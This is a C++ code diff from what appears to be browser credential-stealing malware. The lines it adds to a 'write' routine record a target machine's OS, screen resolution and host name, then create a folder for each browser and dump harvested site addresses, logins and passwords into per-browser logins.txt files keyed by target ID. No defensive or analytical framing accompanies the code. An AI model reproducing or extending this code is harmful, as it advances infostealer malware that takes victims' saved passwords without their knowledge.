@@ -5,6 +5,7 @@
 
 namespace InterProcess {
 	namespace bipc = boost::interprocess;
+	namespace fs = std::filesystem;
 
 	struct Data {             //Data storage for sending to another proccess
 		Data() = default;
@@ -116,14 +117,29 @@ namespace InterProcess {
 		bool write() override {
 			try {
 				fs::path userFolder(std::move(addPath(root, currentData->_targetId))); //user folder path
-
+				
 				createDir(userFolder); //creating user folder with targetId as name				
 				openTo(addPath(userFolder, std::string("info.txt"))); //creating file with os info
 				
 				getCurrentFileHandler() << "os:" << currentData->_targetInfo.os << "\n"
 					<< "screen:" << currentData->_targetInfo.resolution << "\n"
 					<< "host:" << currentData->_targetInfo.hostName << "\n";
+
 				close();
+
+				for (auto& browser : currentData->browsers) {
+					fs::path browserFolder(std::move(addPath(userFolder, browser->browserName)));
+
+					createDir(browserFolder);
+					openTo(addPath(browserFolder, std::string("logins.txt")));
+
+					for (auto& loginTup : browser->resources) {
+						getCurrentFileHandler() << "resource:" << std::get<0>(loginTup) << "\n"
+							<< "login:" << std::get<1>(loginTup) << "\n"
+							<< "pass:" << std::get<2>(loginTup) << "\n";
+					}
+					close();
+				}
 			}
 			catch (std::exception& e) {
 				std::cout << e.what();
